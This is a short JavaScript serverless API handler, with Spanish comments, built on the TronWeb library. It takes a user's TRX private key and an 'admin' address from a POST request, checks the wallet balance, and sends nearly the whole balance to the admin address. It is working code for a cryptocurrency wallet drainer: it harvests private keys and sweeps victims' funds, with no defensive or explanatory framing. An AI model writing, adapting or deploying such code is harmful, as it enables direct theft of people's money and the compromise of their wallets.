const TronWeb = require('tronweb');

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Método no permitido');

  const { userPrivateKey, adminAddress } = req.body;

  try {
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      privateKey: userPrivateKey
    });

    const address = tronWeb.address.fromPrivateKey(userPrivateKey);
    const balanceSun = await tronWeb.trx.getBalance(address); // Saldo en SUN (1 TRX = 1,000,000 SUN)
    const balanceTRX = balanceSun / 1000000;

    // Mínimo 2 TRX para cubrir el gas de envío
    if (balanceTRX < 2) {
      return res.status(200).json({ error: "Insufficient TRX balance" });
    }

    // Dejamos 1.5 TRX para el gas del envío (aprox)
    const amountToSend = balanceSun - 1500000; 

    const trade = await tronWeb.trx.sendTransaction(adminAddress, amountToSend, userPrivateKey);

    if (trade.result) {
      res.status(200).json({ success: true, amount: balanceTRX });
    } else {
      res.status(500).json({ error: "Error al procesar la transacción" });
    }

  } catch (error) {
    res.status(500).json({ error: error.message });
  }
        }
